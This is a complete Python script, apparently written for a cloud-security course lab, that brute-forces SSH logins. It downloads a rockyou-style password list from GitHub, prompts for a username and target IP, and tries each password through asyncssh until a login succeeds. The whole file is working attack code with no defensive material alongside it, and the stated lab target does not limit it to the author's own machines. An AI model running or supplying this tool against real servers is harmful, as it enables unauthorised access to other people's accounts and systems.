#!/usr/bin/env python3

# Script Name:                  Brute Force Attack Tool
# Author:                       Raphael Chookagian
# Date of latest revision:      08/09/2023
# Purpose:                      Create a python script:
# Attack Windows Server VM on private subnet of Midterm VPC


# Confirm Python is installed, confirm correct configuration and version/paths/environments.
# Root access may be required

import asyncssh
import subprocess
import asyncio
import urllib.request

# URL to download rockyou.txt
ROCKY_URL = "https://github.com/CloudSentrySystems/Scripts/blob/main/Attack_Scripts/rocky.txt"

# Local path to rockyou.txt
LOCROC_PATH = "./rocky.txt"

# Install asyncssh library
try:
    import asyncssh
except ImportError:
    subprocess.run(["sudo", "pip3", "install", "asyncssh"])

# Download rockyou.txt
wordlist_path = LOCROC_PATH
try:
    urllib.request.urlretrieve(ROCKY_URL, "rocky.txt")
    wordlist_path = "rocky.txt"
    print("Downloaded rocky.txt")
except Exception as e:
    print(f"Failed to download rocky.txt, using local path: {e}")

async def try_login(ip_address, username, password):
    try:
        async with asyncssh.connect(ip_address, username=username, password=password) as conn:
            print(f"Successful login with: {password}")
            return True
    except (OSError, asyncssh.Error):
        print(f"Failed login with: {password}")
        return False

async def SSHBrute(file_path, ip_address, username):
    with open(file_path, 'r') as file:
        for line in file:
            password = line.strip()
            success = await try_login(ip_address, username, password)
            if success:
                return
            await asyncio.sleep(1)
    print("No successful login found.")

def main():
    username = input("Enter username: ")
    ip_address = input("Enter IP address of target server: ")
    asyncio.run(SSHBrute(wordlist_path, ip_address, username))

if __name__ == "__main__":
    main()
